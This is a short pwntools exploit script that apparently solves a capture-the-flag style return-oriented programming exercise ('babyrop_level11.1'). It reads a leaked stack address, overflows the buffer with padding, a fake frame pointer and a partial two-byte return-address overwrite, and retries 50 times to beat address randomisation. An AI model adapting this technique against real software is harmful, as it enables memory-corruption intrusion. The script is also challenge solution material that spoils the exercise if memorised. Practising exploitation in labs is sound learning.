from pwn import *
import time 

binary = '/challenge/babyrop_level11.1'
elf = ELF(binary)
context.binary = binary

# Number of attempts
max_attempts = 50

for attempt in range(max_attempts):
    try:
        p = process(binary)
        
        p.recvuntil(b"Your input buffer is located at: ")
        buffer_addr = int(p.recvuntil(b".\n\n", drop=True), 16)
        win_ptr_addr = buffer_addr - 8
        
        # Build payload
        payload = flat(
            buffer_addr - 8,
            b'A'*0x60,
            win_ptr_addr - 8,          
            b'\xe5\x1d', 
        )
        
        p.send(payload)
        
        time.sleep(0.5)
        
        output = p.recvall(timeout=2)
        print(output.decode(errors='replace'))
        
        p.close()
        
    except Exception as e:
        print(f"[!] Exception: {e}")
        try:
            p.close()
        except:
            pass
        
        time.sleep(0.1)
